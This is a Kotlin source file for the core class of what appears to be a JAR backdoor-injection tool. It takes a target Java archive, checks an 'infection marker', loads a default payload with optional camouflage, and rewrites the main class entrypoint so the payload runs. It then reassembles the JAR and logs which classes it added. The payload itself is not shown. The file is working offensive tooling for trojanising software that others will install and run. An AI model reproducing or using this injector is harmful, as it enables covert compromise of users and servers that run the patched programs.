package com.tmquan2508.inject.core

import com.github.ajalt.mordant.rendering.TextColors.*
import com.tmquan2508.inject.cli.Logs
import com.tmquan2508.inject.config.Config
import com.tmquan2508.inject.core.analysis.JarAnalyzer
import com.tmquan2508.inject.core.analysis.JavaVersionScanner
import com.tmquan2508.inject.core.analysis.TargetJarInfo
import com.tmquan2508.inject.core.assembly.InfectionMarker
import com.tmquan2508.inject.core.assembly.JarAssembler
import com.tmquan2508.inject.core.patcher.MainClassPatcher
import com.tmquan2508.inject.core.payload.PayloadLoader
import com.tmquan2508.inject.core.payload.PayloadProcessor
import com.tmquan2508.inject.core.payload.ProcessedPayload
import java.io.IOException
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.StandardCopyOption

class JarPatcher(
    private val inputPath: Path,
    private val outputPath: Path,
    private val camouflage: Boolean,
    private val config: Config
) {
    private val infectionMarker = InfectionMarker()
    private val jarAnalyzer = JarAnalyzer()
    private val versionScanner = JavaVersionScanner()
    private val payloadLoader = PayloadLoader()
    private val payloadProcessor = PayloadProcessor()
    private val mainClassPatcher = MainClassPatcher()
    private val jarAssembler = JarAssembler()

    private lateinit var tempDir: Path
    private lateinit var tempJarPath: Path

    fun patch() {
        if (!Files.exists(inputPath)) {
            Logs.error("Input file does not exist: $inputPath")
            return
        }

        Logs.task("Patching ${inputPath.fileName}")
        try {
            prepareWorkspace()

            Logs.info("[STEP 1] Analyzing target JAR...")
            if (infectionMarker.isAlreadyPatched(tempJarPath)) {
                Logs.finish().warn("Target is already patched. Skipping.")
                return
            }
            val targetInfo = jarAnalyzer.analyze(tempJarPath)
            val dominantVersion = versionScanner.findDominantVersion(tempJarPath)
            Logs.info(" -> Found main class: ${brightCyan(targetInfo.mainClassName)}")
            Logs.info(" -> Dominant Java version: ${brightCyan("Major " + dominantVersion.major)} (e.g., Java ${dominantVersion.major - 44})")

            Logs.info("[STEP 2] Processing payload...")
            val rawPayload = payloadLoader.loadDefault()
            val processedPayload = payloadProcessor.process(rawPayload, camouflage, tempJarPath.toFile(), dominantVersion, config)

            Logs.info("[STEP 3] Patching main class entrypoint...")
            val modifiedMainClassBytes = mainClassPatcher.patch(
                targetInfo.mainClassBytes,
                processedPayload.finalMainPayloadName.replace('/', '.')
            )

            Logs.info("[STEP 4] Assembling final JAR file...")
            jarAssembler.assemble(tempJarPath, modifiedMainClassBytes, targetInfo.mainClassPath, processedPayload)
            infectionMarker.set(tempJarPath)

            Files.copy(tempJarPath, outputPath, StandardCopyOption.REPLACE_EXISTING)
            logSummary(targetInfo, processedPayload)
            Logs.finish().info("Successfully patched ${inputPath.fileName} -> ${green(outputPath.fileName.toString())}")

        } catch (e: Exception) {
            handleError(e)
        } finally {
            cleanup()
        }
    }

    private fun prepareWorkspace() {
        tempDir = Files.createTempDirectory("openbd_patch_")
        tempJarPath = tempDir.resolve(inputPath.fileName)
        Files.copy(inputPath, tempJarPath, StandardCopyOption.REPLACE_EXISTING)
    }

    private fun handleError(e: Exception) {
        Logs.finish().error("A critical error occurred while patching ${inputPath.fileName}: ${e.message}")
        if (Logs.debugEnabled) e.printStackTrace()
        try {
            Files.deleteIfExists(outputPath)
        } catch (ioe: IOException) {
            Logs.error("Rollback failed: Could not delete incomplete output file.")
        }
    }

    private fun cleanup() {
        if (this::tempDir.isInitialized && Files.exists(tempDir)) {
            try {
                tempDir.toFile().deleteRecursively()
            } catch (e: IOException) {
                Logs.warn("Could not clean up temporary directory: $tempDir")
            }
        }
    }

    private fun logSummary(targetInfo: TargetJarInfo, processedPayload: ProcessedPayload) {
        Logs.info(" -> Summary of file changes:")
        Logs.info("  ${yellow("MODIFIED:")} ${targetInfo.mainClassPath}")
        Logs.info("  ${brightCyan("ADDED:")}    ${processedPayload.finalMainPayloadName.replace('/', '.')}.class")
        processedPayload.otherClasses.forEach { classFile ->
            Logs.info("  ${brightCyan("ADDED:")}    ${classFile.name.replace('/', '.')}.class")
        }
    }
}